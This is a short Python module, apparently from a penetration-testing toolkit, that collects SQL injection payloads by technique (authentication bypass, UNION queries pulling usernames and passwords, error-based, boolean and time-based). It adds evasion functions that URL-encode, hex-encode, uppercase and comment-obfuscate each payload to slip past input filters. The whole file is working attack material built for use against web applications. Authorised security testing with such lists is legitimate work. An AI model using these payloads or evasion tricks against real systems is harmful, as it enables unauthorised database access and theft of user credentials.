# Unified SQLi Payload Module
# Contributed by Hafsa & Abdul Haseeb - July 2025

import urllib.parse

# Categorized Payloads (from Abdul Haseeb)
payload_categories = {
    "auth": [
        "' OR '1'='1'  --",
        "' OR 'a'='a",
        "' OR '' = '"
    ],
    "union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT 1,2,3--"
    ],
    "error": [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--"
    ],
    "bool": [
        "' AND 1=1--",
        "' AND 1=2--"
    ],
    "time": [
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)#"
    ]
}

# Evasion helpers (from Hafsa)
def encode_payload(payload, method="url"):
    if method == "url":
        return urllib.parse.quote(payload)
    elif method == "hex":
        return ''.join(f"\\x{ord(c):02x}" for c in payload)
    else:
        return payload

def obfuscate_with_comments(payload):
    return payload.replace(" ", "/**/")

# Core Generation Functions
def get_payloads_by_type(category, evasion=False):
    payloads = payload_categories.get(category, [])
    return _apply_evasion(payloads) if evasion else payloads

def get_all_payloads(evasion=False):
    all_payloads = []
    for payload_list in payload_categories.values():
        all_payloads.extend(payload_list)
    return _apply_evasion(all_payloads) if evasion else all_payloads

def _apply_evasion(payloads):
    evaded = []
    for p in payloads:
        evaded.append(p)
        evaded.append(obfuscate_with_comments(p))
        evaded.append(p.upper())
        evaded.append(encode_payload(p, method="url"))
        evaded.append(encode_payload(p, method="hex"))
    return evaded
